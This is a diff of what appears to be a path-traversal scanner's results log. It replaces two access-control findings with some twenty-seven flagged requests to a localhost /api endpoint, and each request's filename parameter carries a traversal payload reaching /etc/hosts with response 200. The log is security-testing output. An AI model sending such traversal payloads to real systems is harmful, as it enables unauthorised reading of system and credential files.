@@ -1,6 +1,189 @@
 
 ----------Potential Vulnerability found!!!----------
-Potential BAC (lvl 1): Access to /api was granted to an authenticated user but not to unauthenticated.
+  URL: http://localhost:4444/api?filename=//etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: 
+  Response code: 200
+
 
 ----------Potential Vulnerability found!!!----------
-Potential BAC (lvl 1): Access to /api/secured was granted to an authenticated user but not to unauthenticated.
+  URL: http://localhost:4444/api?filename=/../../../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../../.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../../../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../.../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../.../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../.././../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../.././..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../../././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../.././.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.../.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.../../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../..../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./..../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../..././../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./..././..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.././../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.././../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.././.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.././../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../../././../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../././..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.././../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./.././..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/../.././././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ./../././.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/.../../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ../../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/.../../.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ../../../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/.../.././../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ../.././..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/.../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/.../../././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ../.././.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/..../../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: .../../..
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/..../.././etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: .../../.
+  Response code: 200
+
+
+----------Potential Vulnerability found!!!----------
+  URL: http://localhost:4444/api?filename=/...../../etc/hosts 
+  Word: /etc/hosts
+  Traversal Path: ..../..
+  Response code: 200
+
